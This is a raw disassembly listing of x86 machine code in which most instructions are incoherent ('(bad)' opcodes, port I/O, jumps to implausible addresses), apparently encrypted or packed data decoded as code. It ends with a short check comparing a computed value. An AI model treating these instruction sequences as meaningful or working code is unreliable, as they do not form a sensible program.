  40e332:	imul   ecx,DWORD PTR [ecx+0x283df125],0x5ae00268
  40e33c:	cdq    
  40e33d:	sub    dl,BYTE PTR [esi-0x4f700bc]
  40e343:	popa   
  40e344:	adc    al,0x8f
  40e346:	xchg   ecx,eax
  40e347:	jne    0x40e3a8
  40e349:	clc    
  40e34a:	cmp    eax,0x5ae6ac13
  40e34f:	mov    al,0x39
  40e351:	sar    edi,0xbd
  40e354:	cmp    DWORD PTR [ebx+eiz*2],ecx
  40e357:	mov    ebp,0x476754cb
  40e35c:	xor    eax,0x53dbc5
  40e361:	stc    
  40e362:	aam    0x10
  40e364:	ret    
  40e365:	in     eax,0xbf
  40e367:	lods   al,BYTE PTR ds:[esi]
  40e368:	stc    
  40e369:	inc    ecx
  40e36a:	out    dx,al
  40e36b:	ror    ecx,1
  40e36d:	mov    ebx,0xc283cd1c
  40e372:	les    edx,FWORD PTR ds:0x6d19e80
  40e378:	push   edi
  40e379:	loop   0x40e38d
  40e37b:	fiadd  WORD PTR [ebp+0x3e9fac56]
  40e381:	mov    ds,WORD PTR [esi+0x2]
  40e384:	rcl    DWORD PTR [ebp*2+0x2d714dfe],cl
  40e38b:	adc    eax,0x287a0224
  40e390:	pushf  
  40e391:	pusha  
  40e392:	xor    eax,0x3fbea45e
  40e397:	mov    ah,0xd7
  40e399:	jnp    0x40e33c
  40e39b:	retf   0x858b
  40e39e:	retf   
  40e39f:	xor    ah,BYTE PTR [edi+esi*8+0x58e4a71f]
  40e3a6:	add    al,0xcd
  40e3a8:	xor    DWORD PTR [ecx-0x4813a212],ebx
  40e3ae:	mov    dl,BYTE PTR [edi-0x24]
  40e3b1:	fwait
  40e3b2:	(bad)  
  40e3b3:	cld    
  40e3b4:	inc    ebx
  40e3b5:	mov    bh,0x50
  40e3b7:	dec    ecx
  40e3b8:	mul    BYTE PTR [edi+0x4db8c22]
  40e3be:	xchg   edx,eax
  40e3bf:	mov    sp,0xc13a
  40e3c3:	or     BYTE PTR [edx+0x64],cl
  40e3c6:	aaa    
  40e3c7:	sbb    BYTE PTR [esi],0x5a
  40e3ca:	dec    ch
  40e3cc:	cmp    ebp,DWORD PTR [edi+0x5e]
  40e3cf:	stos   DWORD PTR es:[edi],eax
  40e3d0:	inc    esi
  40e3d1:	dec    edx
  40e3d2:	fisttp WORD PTR es:0x67591a2f
  40e3d9:	mov    WORD PTR [ebp-0x64],sp
  40e3dd:	cld    
  40e3de:	adc    BYTE PTR [ebp+0x2b],0xc1
  40e3e2:	pop    esp
  40e3e3:	lea    ecx,[edi+0x5b]
  40e3e6:	int3   
  40e3e7:	sbb    DWORD PTR [ebx+0x50],ebx
  40e3ea:	push   cs
  40e3eb:	add    DWORD PTR ds:0x5432f3f4,esi
  40e3f1:	dec    ecx
  40e3f2:	fadd   DWORD PTR [esi]
  40e3f4:	sbb    BYTE PTR [esi-0x5227e060],ch
  40e3fa:	adc    ah,bh
  40e3fc:	test   al,0x49
  40e3fe:	daa    
  40e3ff:	sbb    al,0x2c
  40e401:	push   0x42
  40e403:	jg     0x40e3ab
  40e405:	int3   
  40e406:	xor    al,0x9f
  40e408:	dec    esi
  40e409:	retf   
  40e40a:	mov    edx,0x17b40717
  40e40f:	jg     0x40e453
  40e411:	inc    ebx
  40e412:	adc    DWORD PTR [edi+0x6c],eax
  40e415:	loope  0x40e3f5
  40e417:	outs   dx,BYTE PTR ds:[esi]
  40e418:	and    BYTE PTR [ecx],dh
  40e41a:	inc    ecx
  40e41b:	mov    DWORD PTR [edi+0x27],edi
  40e41e:	out    0x9c,eax
  40e420:	xchg   edi,ebx
  40e422:	xchg   edx,eax
  40e423:	sahf   
  40e424:	jno    0x40e478
  40e426:	mov    dl,0x79
  40e428:	iret   
  40e429:	aad    0xde
  40e42b:	push   es
  40e42c:	xor    esi,DWORD PTR [edi-0x5e6db837]
  40e432:	cmp    al,ah
  40e434:	jae    0x40e403
  40e436:	(bad)  
  40e437:	push   eax
  40e438:	mov    al,0x23
  40e43a:	pop    esi
  40e43b:	add    esi,DWORD PTR [edx+0x3c]
  40e43e:	xor    ecx,DWORD PTR [edx]
  40e440:	repz sar DWORD PTR [esi],cl
  40e443:	pop    edx
  40e444:	mov    WORD PTR ds:0x98d1ea8f,fs
  40e44a:	loope  0x40e422
  40e44c:	in     al,dx
  40e44d:	arpl   ax,dx
  40e44f:	(bad)  
  40e450:	cmp    al,0xaa
  40e452:	hlt    
  40e453:	imul   esp,esp,0xc
  40e456:	lods   eax,DWORD PTR ds:[esi]
  40e457:	std    
  40e458:	sar    BYTE PTR [ebx],0x90
  40e45b:	cmp    DWORD PTR [esi-0x312162ad],0x74d84ea2
  40e465:	jae    0x40e46f
  40e467:	jmp    0x6d910be9
  40e46c:	add    eax,0x5a801a9d
  40e471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e472:	mov    al,0xf9
  40e474:	xlat   BYTE PTR ds:[ebx]
  40e475:	out    dx,al
  40e476:	daa    
  40e477:	and    dh,BYTE PTR [edi-0x2d]
  40e47a:	jmp    0x196:0x9d9eb40f
  40e481:	sets   BYTE PTR [edi]
  40e484:	cmp    ebp,DWORD PTR [eax]
  40e486:	enter  0x6bf,0x70
  40e48a:	enter  0x7ee1,0x7a
  40e48e:	cdq    
  40e48f:	enter  0x38ad,0xe0
  40e493:	das    
  40e494:	cmp    al,0xd9
  40e496:	ror    BYTE PTR [esi-0x585541e0],cl
  40e49c:	sub    ecx,DWORD PTR [eax-0x3b]
  40e49f:	mov    cl,0xb1
  40e4a1:	inc    esi
  40e4a2:	push   ebp
  40e4a3:	jle    0x40e45f
  40e4a5:	fwait
  40e4a6:	int    0x39
  40e4a8:	fisub  DWORD PTR [edx]
  40e4aa:	xchg   edi,eax
  40e4ab:	adc    al,0x2c
  40e4ad:	sub    bl,BYTE PTR ds:0x4f379537
  40e4b3:	(bad)  
  40e4b4:	mov    DWORD PTR [edi+edi*2-0x36],edx
  40e4b8:	retf   0x7352
  40e4bb:	aad    0x94
  40e4bd:	in     eax,0xd3
  40e4bf:	dec    edi
  40e4c0:	aaa    
  40e4c1:	int    0xc5
  40e4c3:	cmp    eax,0xcb1bbf33
  40e4c8:	add    esi,ecx
  40e4ca:	xchg   edi,eax
  40e4cb:	cwde   
  40e4cc:	(bad)  
  40e4cd:	jmp    0x40e4f0
  40e4cf:	add    BYTE PTR [eax],bl
  40e4d1:	xchg   BYTE PTR [esi+0x53b2a282],ah
  40e4d7:	popa   
  40e4d8:	sti    
  40e4d9:	push   0x45
  40e4db:	dec    ecx
  40e4dc:	cs xchg esi,eax
  40e4de:	jno    0x40e4ee
  40e4e0:	test   DWORD PTR [ecx-0x5d],eax
  40e4e3:	aam    0xa4
  40e4e5:	(bad)  
  40e4e7:	pop    ebx
  40e4e8:	repnz popf 
  40e4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4eb:	xor    esp,edx
  40e4ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ee:	mov    ecx,0xf2ef0020
  40e4f3:	and    eax,0x1fad615d
  40e4f8:	push   ebx
  40e4f9:	test   ebp,0x9f56d33a
  40e4ff:	mov    ch,0xfa
  40e501:	retf   
  40e502:	mov    ds:0x15d94b35,al
  40e507:	ins    BYTE PTR es:[edi],dx
  40e508:	jmp    0x33da966b
  40e50d:	sbb    ebp,DWORD PTR [eax+0x3626d3a4]
  40e513:	jae    0x40e511
  40e515:	sar    BYTE PTR [eax+0x65450f29],cl
  40e51b:	icebp  
  40e51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e51d:	inc    ecx
  40e51e:	ss test dh,bh
  40e521:	lahf   
  40e522:	iret   
  40e523:	adc    eax,0x5b1c4da3
  40e528:	cld    
  40e529:	jnp    0x40e53a
  40e52b:	sbb    DWORD PTR [ebp-0x2cba7b8e],ebx
  40e531:	xchg   edi,eax
  40e532:	ja     0x40e562
  40e534:	repnz inc esp
  40e536:	bound  ebp,QWORD PTR [ecx+0x6d]
  40e539:	jns    0x40e574
  40e53b:	data16 (bad) 
  40e53d:	rcl    BYTE PTR [edx],0x8c
  40e540:	out    0xe2,al
  40e542:	pop    eax
  40e543:	out    dx,al
  40e544:	sub    DWORD PTR [ebx],edx
  40e546:	sbb    edx,0xfffffffa
  40e549:	jnp    0x40e556
  40e54b:	lods   al,BYTE PTR ds:[esi]
  40e54c:	adc    eax,0x8671eb63
  40e551:	(bad)  
  40e552:	test   al,0xd
  40e554:	xchg   DWORD PTR [eax-0x5b4af7ff],eax
  40e55a:	xor    eax,0xff8f80f4
  40e55f:	jmp    0xe71875ee
  40e564:	add    al,0xf8
  40e566:	push   ebx
  40e567:	std    
  40e568:	fnstcw WORD PTR [ecx-0x2e]
  40e56b:	call   0x74b97e89
  40e570:	xchg   edi,eax
  40e571:	push   ebx
  40e572:	dec    ecx
  40e573:	iret   
  40e574:	xchg   BYTE PTR [ecx],ah
  40e576:	inc    ebp
  40e577:	push   ss
  40e578:	sbb    BYTE PTR [ebx],bl
  40e57a:	pushf  
  40e57b:	or     esp,DWORD PTR gs:[edi-0x1d]
  40e57f:	pop    ebp
  40e580:	or     al,0xe1
  40e582:	adc    ecx,DWORD PTR [ecx+0x786dcd6a]
  40e588:	ja     0x40e549
  40e58a:	fwait
  40e58b:	add    DWORD PTR [esi-0x5d],esi
  40e58e:	mov    fs,WORD PTR [eax+0x3d4fb03]
  40e594:	inc    ebp
  40e595:	movaps xmm3,XMMWORD PTR [eax-0x22]
  40e599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e59a:	ret    
  40e59b:	mov    bh,0xbe
  40e59d:	retf   0x959
  40e5a0:	xlat   BYTE PTR ds:[ebx]
  40e5a1:	mov    ds:0x72bb5b41,al
  40e5a6:	jmp    0x40e609
  40e5a8:	loope  0x40e57c
  40e5aa:	test   bh,cl
  40e5ac:	loopne 0x40e564
  40e5ae:	adc    BYTE PTR [ebx-0x22],0xb8
  40e5b2:	push   esp
  40e5b3:	jno    0x40e5fb
  40e5b5:	ret    0x38c7
  40e5b8:	data16 xlat BYTE PTR ds:[ebx]
  40e5ba:	rcl    BYTE PTR [ebx],0x5f
  40e5bd:	mov    ds:0xb393c3f0,al
  40e5c2:	inc    ebp
  40e5c3:	jno    0x40e567
  40e5c5:	fiadd  WORD PTR [esi+0x1f6896e]
  40e5cb:	fwait
  40e5cc:	mov    esp,ebx
  40e5ce:	test   DWORD PTR [eax+ecx*8],eax
  40e5d1:	cmp    ebp,edi
  40e5d3:	jb     0x40e636
  40e5d5:	adc    ecx,ebx
  40e5d7:	inc    esi
  40e5d8:	or     al,0x15
  40e5da:	xor    eax,0x64f6fd64
  40e5df:	push   ds
  40e5e0:	mov    al,BYTE PTR [edi]
  40e5e2:	add    eax,0x81be3b99
  40e5e7:	sbb    eax,edx
  40e5e9:	scas   al,BYTE PTR es:[edi]
  40e5ea:	stos   BYTE PTR es:[edi],al
  40e5eb:	pop    ds
  40e5ec:	rcr    esp,1
  40e5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ef:	mov    esp,0x13156729
  40e5f4:	fldenv [bx+di]
  40e5f7:	cmp    ch,bl
  40e5f9:	add    al,0x5d
  40e5fb:	fxch   st(0)
  40e5fd:	add    ch,dl
  40e5ff:	or     bh,dh
  40e601:	cmc    
  40e602:	mov    al,0xcc
  40e604:	les    edi,FWORD PTR [edx+0x14a64ccd]
  40e60a:	jno    0x40e5c8
  40e60c:	xchg   DWORD PTR [edi],eax
  40e60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e60f:	ret    0x638d
  40e612:	and    eax,0x8a9e6bbe
  40e617:	xor    BYTE PTR [ebx-0x1],al
  40e61a:	dec    eax
  40e61b:	pop    esi
  40e61c:	add    dl,ch
  40e61e:	fdivr  QWORD PTR [ecx+0x29]
  40e621:	sub    DWORD PTR [edi-0x36c33fc1],0xe8c3d191
  40e62b:	mov    esi,0xa64d3f9
  40e630:	dec    esi
  40e631:	mov    edx,0x391eb769
  40e636:	inc    esi
  40e637:	fild   DWORD PTR [ecx]
  40e639:	fs jecxz 0x40e64c
  40e63c:	mov    cs,ebp
  40e63e:	jmp    0xc3082aa3
  40e643:	inc    eax
  40e644:	inc    ebx
  40e645:	cmc    
  40e646:	jae    0x40e6a7
  40e648:	add    cl,0x28
  40e64b:	pop    ds
  40e64c:	int3   
  40e64d:	sbb    DWORD PTR [ecx],ebx
  40e64f:	loop   0x40e5d9
  40e651:	jl     0x40e679
  40e653:	pop    ebp
  40e654:	or     BYTE PTR [eax+0x48],cl
  40e657:	inc    esi
  40e658:	gs push esp
  40e65a:	cmp    bh,al
  40e65c:	and    ebp,DWORD PTR [edi+0x15]
  40e65f:	fsubr  QWORD PTR [edx-0x73fdff79]
  40e665:	pop    ebx
  40e666:	push   esp
  40e667:	fucomi st,st(4)
  40e669:	xor    BYTE PTR [edi],dl
  40e66b:	or     eax,ebp
  40e66d:	xchg   ebp,eax
  40e66e:	or     bl,al
  40e670:	push   0x2d
  40e672:	adc    al,0x8b
  40e674:	cmp    eax,0x476b33
  40e679:	cld    
  40e67a:	adc    esi,DWORD PTR [edi]
  40e67c:	add    eax,0x6257e21f
  40e681:	ins    BYTE PTR es:[edi],dx
  40e682:	jno    0x40e6a6
  40e684:	mov    dh,0x8d
  40e686:	jl     0x40e648
  40e688:	push   0x7f2619b2
  40e68d:	mov    eax,DWORD PTR [eax+ebx*4+0x50dbb697]
  40e694:	mov    ds:0x51d73820,al
  40e699:	lea    ecx,ds:0x961e465c
  40e69f:	clc    
  40e6a0:	dec    ecx
  40e6a1:	imul   DWORD PTR [esi+0x37579073]
  40e6a7:	ret    
  40e6a8:	repz arpl ax,di
  40e6ab:	inc    ebp
  40e6ac:	or     eax,0x2f19bbf8
  40e6b1:	push   cs
  40e6b2:	add    al,0x24
  40e6b4:	(bad)  
  40e6b5:	jns    0x40e641
  40e6b7:	call   0x90bd8114
  40e6bc:	mov    DWORD PTR [ebx-0x5663b158],edi
  40e6c2:	jns    0x40e69d
  40e6c4:	scas   eax,DWORD PTR es:[edi]
  40e6c5:	ins    BYTE PTR es:[edi],dx
  40e6c6:	pop    ecx
  40e6c7:	ds jbe 0x40e6cf
  40e6ca:	and    eax,0x8c69dfca
  40e6cf:	out    0x8c,eax
  40e6d1:	cmp    eax,0x89a3f097
  40e6d6:	add    ecx,ebp
  40e6d8:	rol    DWORD PTR [ebx],0x0
  40e6db:	add    BYTE PTR [ebx],cl
  40e6dd:	push   0x67
  40e6df:	aam    0x61
  40e6e1:	(bad)  [ebx+0x4d03ef7d]
  40e6e7:	jns    0x40e71e
  40e6e9:	in     eax,dx
  40e6ea:	into   
  40e6eb:	or     BYTE PTR [ecx+eiz*4+0x7c],ch
  40e6ef:	jl     0x40e698
  40e6f1:	jns    0x40e76f
  40e6f3:	jl     0x40e727
  40e6f5:	fcomi  st,st(5)
  40e6f7:	jg     0x40e6a0
  40e6f9:	xor    bh,BYTE PTR [esi+0x7]
  40e6fc:	repnz outs dx,DWORD PTR ds:[esi]
  40e6fe:	jne    0x40e767
  40e700:	(bad)
  40e703:	mov    al,ds:0x449a7d6
  40e708:	push   edx
  40e709:	jl     0x40e756
  40e70b:	mov    dl,0xcb
  40e70d:	sbb    al,0x27
  40e70f:	xchg   ebx,eax
  40e710:	sbb    al,0xca
  40e712:	jmp    0x82d67cbf
  40e717:	mov    bl,0x86
  40e719:	mov    al,0x11
  40e71b:	push   ds
  40e71c:	inc    ebp
  40e71d:	es mov dl,0x44
  40e720:	cwde   
  40e721:	rcl    DWORD PTR [esi],0xe0
  40e724:	lahf   
  40e725:	mov    edi,0x2e0b1fdf
  40e72a:	cmp    ah,BYTE PTR [esi-0x27]
  40e72d:	loope  0x40e72d
  40e72f:	iret   
  40e730:	(bad)  
  40e731:	cmp    eax,0x2b1e072b
  40e736:	xor    eax,edx
  40e738:	sbb    DWORD PTR [edx+0x5d],esp
  40e73b:	js     0x40e6fa
  40e73d:	nop
  40e73e:	inc    edx
  40e73f:	inc    esi
  40e740:	mov    cl,0x0
  40e742:	scas   al,BYTE PTR es:[edi]
  40e743:	das    
  40e744:	lahf   
  40e745:	sbb    esi,ebx
  40e747:	xchg   edx,eax
  40e748:	adc    al,0xee
  40e74a:	retf   0x1189
  40e74d:	mov    esi,0x1d238447
  40e752:	mov    ch,0x53
  40e754:	push   ecx
  40e755:	mov    esp,fs
  40e757:	push   0x6df03343
  40e75c:	clc    
  40e75d:	and    dl,cl
  40e75f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e760:	cld    
  40e761:	lods   al,BYTE PTR ds:[esi]
  40e762:	gs (bad) 
  40e764:	repz loope 0x40e765
  40e767:	and    eax,0x45d193c1
  40e76c:	dec    esi
  40e76d:	adc    esi,DWORD PTR [eax-0x57]
  40e770:	(bad)  
  40e772:	mov    bh,BYTE PTR ds:0x6b12a401
  40e778:	outs   dx,BYTE PTR ds:[esi]
  40e779:	cmp    eax,0xe726d2ed
  40e77e:	scas   al,BYTE PTR es:[edi]
  40e77f:	in     eax,0x8e
  40e781:	mov    edi,0x4a53262a
  40e786:	jg     0x40e7a6
  40e788:	mov    WORD PTR [edi],ss
  40e78a:	xor    eax,0x615aa6ce
  40e78f:	jb     0x40e7df
  40e791:	xor    eax,0xd568335b
  40e796:	imul   ebp,DWORD PTR [ecx-0x1d73473d],0xb893d85f
  40e7a0:	stos   BYTE PTR es:[edi],al
  40e7a1:	jp     0x40e793
  40e7a3:	jno    0x40e769
  40e7a5:	or     esp,DWORD PTR [ecx-0x10]
  40e7a8:	mov    edx,0xa02067ca
  40e7ad:	mov    ds:0xc4606d79,al
  40e7b2:	les    ebp,FWORD PTR [edi]
  40e7b4:	xor    cl,0xcf
  40e7b7:	xchg   ch,bh
  40e7b9:	stos   DWORD PTR es:[edi],eax
  40e7ba:	in     eax,0xc8
  40e7bc:	out    dx,al
  40e7bd:	pop    esp
  40e7be:	mov    BYTE PTR [ecx+eax*1],dl
  40e7c1:	xchg   BYTE PTR [eax-0x29afd8c8],ch
  40e7c7:	ins    BYTE PTR es:[edi],dx
  40e7c8:	rcr    edx,cl
  40e7ca:	pop    ds
  40e7cb:	sti    
  40e7cc:	mov    eax,ds:0xecc41ded
  40e7d1:	add    DWORD PTR [ebx-0x138a843e],edi
  40e7d7:	data16 jbe 0x40e81b
  40e7da:	cdq    
  40e7db:	add    BYTE PTR [ecx],bl
  40e7dd:	xchg   edx,eax
  40e7de:	xchg   ebx,eax
  40e7df:	(bad)  
  40e7e0:	sti    
  40e7e1:	mov    ebp,0x3307e30b
  40e7e6:	lods   al,BYTE PTR ds:[esi]
  40e7e7:	cld    
  40e7e8:	or     edi,DWORD PTR [eax-0x8586a2]
  40e7ee:	and    bl,BYTE PTR [ecx+0x32f92e82]
  40e7f4:	into   
  40e7f5:	ins    DWORD PTR es:[edi],dx
  40e7f6:	mul    BYTE PTR [ebp+0x7b97e2eb]
  40e7fc:	mov    BYTE PTR [edi+0x2f],cl
  40e7ff:	mov    ds:0xd5600871,eax
  40e804:	sub    eax,DWORD PTR [edi-0x6e4026c8]
  40e80a:	jno    0x40e7da
  40e80c:	mov    fs,esp
  40e80e:	xor    eax,0xcf4d5c87
  40e813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e814:	cmp    al,0x4f
  40e816:	ins    DWORD PTR es:[edi],dx
  40e817:	(bad)
  40e81a:	xchg   BYTE PTR [eax+0x76],dh
  40e81d:	adc    DWORD PTR [ebx],esp
  40e81f:	in     eax,dx
  40e820:	xor    dx,di
  40e823:	enter  0xc9ab,0x1b
  40e827:	into   
  40e828:	fidiv  WORD PTR [edi]
  40e82a:	lds    eax,FWORD PTR [esi]
  40e82c:	aam    0x35
  40e82e:	xchg   ecx,eax
  40e82f:	push   ss
  40e830:	xor    DWORD PTR [ebp-0x3279fc02],esi
  40e836:	mov    esp,0x4d9209a4
  40e83b:	pop    ebp
  40e83c:	cmp    DWORD PTR [eax+0x40],eax
  40e83f:	dec    ebp
  40e840:	mov    esi,0x963c186e
  40e845:	jnp    0x40e862
  40e847:	mov    edx,0x86ac123
  40e84c:	xchg   edi,eax
  40e84d:	daa    
  40e84e:	xlat   BYTE PTR ds:[ebx]
  40e84f:	pushf  
  40e850:	push   esp
  40e851:	(bad)  
  40e853:	dec    ebp
  40e854:	cmc    
  40e855:	(bad)  
  40e856:	inc    esp
  40e857:	stc    
  40e858:	mov    bl,0xf5
  40e85a:	inc    ebp
  40e85b:	xchg   ebx,eax
  40e85c:	ins    DWORD PTR es:[edi],dx
  40e85d:	jp     0x40e883
  40e85f:	pusha  
  40e860:	cld    
  40e861:	add    al,0x8e
  40e863:	mov    esi,0x2be0f2c7
  40e868:	or     edi,eax
  40e86a:	test   al,0xba
  40e86c:	stos   BYTE PTR es:[edi],al
  40e86d:	sub    DWORD PTR [ebx+0x3a002862],edi
  40e873:	push   ebp
  40e874:	mov    ds:0x86f6f0bc,eax
  40e879:	les    eax,FWORD PTR [ebx]
  40e87b:	inc    esp
  40e87c:	scas   al,BYTE PTR es:[edi]
  40e87d:	xchg   ebx,eax
  40e87e:	cmp    bh,al
  40e880:	push   eax
  40e881:	sub    BYTE PTR [ebx-0x4f],ch
  40e884:	sub    eax,0xc16ac092
  40e889:	jg     0x40e899
  40e88b:	(bad)  
  40e88c:	fcmovbe st,st(0)
  40e88e:	add    al,0x34
  40e890:	repnz inc esi
  40e892:	sbb    bh,BYTE PTR [ecx+ecx*1+0x479ca4ae]
  40e899:	cli    
  40e89a:	cwde   
  40e89b:	call   0xb433:0xe232876
  40e8a2:	jg     0x40e85b
  40e8a4:	adc    eax,DWORD PTR [ebp+eax*8-0x1784a2e3]
  40e8ab:	mov    DWORD PTR ds:0x52833f6,esi
  40e8b1:	aad    0xb3
  40e8b3:	dec    edx
  40e8b4:	shl    BYTE PTR [ecx-0x21],1
  40e8b7:	xchg   esi,eax
  40e8b8:	shl    DWORD PTR [ebx+0x33],0x39
  40e8bc:	imul   ecx,DWORD PTR [eax],0x7d58c111
  40e8c2:	and    ah,BYTE PTR [ebp-0x7b]
  40e8c5:	xchg   ebx,eax
  40e8c6:	jo     0x40e8fe
  40e8c8:	mov    WORD PTR [ecx+0x67],fs
  40e8cb:	jno    0x40e90b
  40e8cd:	xlat   BYTE PTR ds:[ebx]
  40e8ce:	retf   0x7de3
  40e8d1:	xchg   esp,eax
  40e8d2:	fisubr DWORD PTR [eax+0x52f63138]
  40e8d8:	mov    ch,0xb4
  40e8da:	mov    al,ds:0x50eae889
  40e8df:	and    eax,0x3bd232ff
  40e8e4:	std    
  40e8e5:	sub    ch,ch
  40e8e7:	aas    
  40e8e8:	push   esi
  40e8e9:	inc    ebp
  40e8ea:	cmp    DWORD PTR [ecx+0x5aba923c],ebp
  40e8f0:	es xor al,0xf
  40e8f3:	outs   dx,DWORD PTR ds:[esi]
  40e8f4:	fdiv   DWORD PTR [edx+0x21]
  40e8f7:	push   es
  40e8f8:	imul   ebx,edx,0x452e5b29
  40e8fe:	(bad)  
  40e8ff:	adc    al,0x9e
  40e901:	sub    al,0x60
  40e903:	sub    eax,0x40a48ba2
  40e908:	mov    ds:0x13e9e1a0,eax
  40e90d:	or     DWORD PTR [ebp+0x5d53fb40],edi
  40e913:	or     DWORD PTR [ebp+0x536901ff],edx
  40e919:	add    ebx,esi
  40e91b:	mov    ah,0xa5
  40e91d:	je     0x40e947
  40e91f:	jo     0x40e93e
  40e921:	mov    ebx,0xa9aaa71d
  40e926:	pop    eax
  40e927:	add    ecx,0x75
  40e92a:	fadd   QWORD PTR [ebp+esi*1-0x64]
  40e92e:	sub    dh,BYTE PTR [edi-0x8617774]
  40e934:	(bad)  
  40e935:	xchg   esp,eax
  40e936:	gs lock jbe 0x40e95b
  40e93a:	push   es
  40e93b:	adc    cl,BYTE PTR [ecx]
  40e93d:	xchg   DWORD PTR [ecx-0x3942ea0c],esp
  40e943:	xchg   edx,eax
  40e944:	out    dx,al
  40e945:	jae    0x40e95e
  40e947:	jmp    0x40e979
  40e949:	pop    ss
  40e94a:	test   esp,0x70ca0ee6
  40e950:	adc    al,0x63
  40e952:	enter  0xa3a1,0x83
  40e956:	jmp    DWORD PTR [esi+0x38]
  40e959:	xchg   esi,eax
  40e95a:	jbe    0x40e8fb
  40e95c:	lock ja 0x40e95d
  40e95f:	xor    ebp,DWORD PTR [esi]
  40e961:	and    eax,0x608d6dac
  40e966:	rcl    DWORD PTR [eax],0xbf
  40e969:	into   
  40e96a:	es jl  0x40e952
  40e96d:	dec    eax
  40e96e:	lods   al,BYTE PTR ds:[esi]
  40e96f:	dec    esp
  40e970:	fnstenv [ecx-0x75ef64a2]
  40e976:	inc    eax
  40e977:	call   0x5c77:0xe39b0de
  40e97e:	inc    ecx
  40e97f:	mov    ch,0x94
  40e981:	shr    DWORD PTR [edi+eiz*1+0x23baae3b],1
  40e988:	jo     0x40e9bc
  40e98a:	lea    esi,[eax+0x3190be79]
  40e990:	test   BYTE PTR [ebx-0x6f],cl
  40e993:	mov    bl,0x38
  40e995:	fisttp DWORD PTR [edi]
  40e997:	sbb    bh,0xce
  40e99a:	adc    eax,0x9ecf2be3
  40e99f:	out    0x45,al
  40e9a1:	fsubr  DWORD PTR [esi+0x610b938d]
  40e9a7:	jl     0x40e9c1
  40e9a9:	popf   
  40e9aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ab:	das    
  40e9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ad:	mov    edx,0x693d523a
  40e9b2:	inc    eax
  40e9b3:	inc    DWORD PTR [ebp-0x3c1b9f8f]
  40e9b9:	out    0x5a,al
  40e9bb:	cmp    eax,0x5a975bf2
  40e9c0:	push   ebp
  40e9c1:	fsub   QWORD PTR ds:0x53c485b0
  40e9c7:	fistp  DWORD PTR ds:0x4d38bd2a
  40e9cd:	nop
  40e9ce:	divps  xmm4,XMMWORD PTR [ebx-0x21]
  40e9d2:	or     al,0x23
  40e9d4:	popa   
  40e9d5:	ja     0x40e9bf
  40e9d7:	mul    BYTE PTR [ecx]
  40e9d9:	imul   ebx,DWORD PTR [eax-0x23],0xcf1b6ff1
  40e9e0:	push   0x65
  40e9e2:	inc    ebx
  40e9e3:	xchg   edx,eax
  40e9e4:	pop    esp
  40e9e5:	shr    DWORD PTR [edx-0x35],0x8c
  40e9e9:	push   edx
  40e9ea:	lds    ebp,FWORD PTR fs:[edi+0x2c232240]
  40e9f1:	jp     0x40e989
  40e9f3:	pop    eax
  40e9f4:	mov    BYTE PTR [eax],0x27
  40e9f7:	out    dx,eax
  40e9f8:	pusha  
  40e9f9:	dec    ebx
  40e9fa:	das    
  40e9fb:	pop    edi
  40e9fc:	retf   0x51fd
  40e9ff:	mov    dl,0x17
  40ea01:	test   eax,0x6e4fca85
  40ea06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea07:	mov    cs,WORD PTR [edx-0x7d16a2d7]
  40ea0d:	mov    ch,0x34
  40ea0f:	mov    ch,0x83
  40ea11:	out    dx,eax
  40ea12:	pop    ecx
  40ea13:	daa    
  40ea14:	movsx  ecx,BYTE PTR [edi+eax*4]
  40ea18:	push   esp
  40ea19:	sti    
  40ea1a:	sub    eax,0x208295be
  40ea1f:	pop    eax
  40ea20:	inc    ebp
  40ea21:	stos   DWORD PTR es:[edi],eax
  40ea22:	pop    ebx
  40ea23:	faddp  st(7),st
  40ea25:	xor    esp,DWORD PTR [edi-0x1d]
  40ea28:	int    0xf9
  40ea2a:	(bad)  [ecx]
  40ea2c:	xor    eax,0x81f49835
  40ea31:	mov    al,ds:0xf94db5ad
  40ea36:	es (bad) 
  40ea3a:	retf   
  40ea3b:	lea    ebp,[edx]
  40ea3d:	sub    BYTE PTR [eax+ebp*2+0x80eaa7f],cl
  40ea44:	aad    0xa7
  40ea46:	mov    edi,0xb08dc7eb
  40ea4b:	outs   dx,DWORD PTR ds:[esi]
  40ea4c:	inc    edi
  40ea4d:	and    BYTE PTR es:[edi],dl
  40ea50:	xchg   ecx,eax
  40ea51:	ins    BYTE PTR es:[edi],dx
  40ea52:	push   0xee346443
  40ea57:	arpl   WORD PTR [edx+0x214e6185],di
  40ea5d:	out    dx,eax
  40ea5e:	lds    edx,FWORD PTR [edi+0x4b0c3ea5]
  40ea64:	add    eax,0xa04b6958
  40ea69:	hlt    
  40ea6a:	stc    
  40ea6b:	cmp    eax,0xd735aae2
  40ea70:	cdq    
  40ea71:	aad    0x74
  40ea73:	loopne 0x40ea89
  40ea75:	mov    cl,0xe8
  40ea77:	mov    dl,0x1d
  40ea79:	stos   BYTE PTR es:[edi],al
  40ea7a:	(bad)  
  40ea7b:	fild   WORD PTR [ebp+0x2bd83ab0]
  40ea81:	sbb    eax,0x6ce3a577
  40ea86:	dec    esi
  40ea87:	fs cs inc esp
  40ea8a:	xor    BYTE PTR [edi-0x69],bl
  40ea8d:	inc    ebp
  40ea8e:	push   edi
  40ea8f:	fisubr DWORD PTR [ebx-0x76]
  40ea92:	in     al,dx
  40ea93:	sbb    edx,esp
  40ea95:	das    
  40ea96:	dec    BYTE PTR [edi-0x2baba46c]
  40ea9c:	mov    DWORD PTR [ebx-0x3b1607bb],ecx
  40eaa2:	pop    es
  40eaa3:	add    BYTE PTR [eax],al
  40eaa5:	mov    eax,DWORD PTR [ebp-0x4]
  40eaa8:	mov    ecx,DWORD PTR [ebp+0x10]
  40eaab:	xor    eax,edi
  40eaad:	add    eax,esi
  40eaaf:	cmp    eax,ecx
  40eab1:	jne    0x40f266
  40eab7:	mov    eax,DWORD PTR [ebp-0x4]
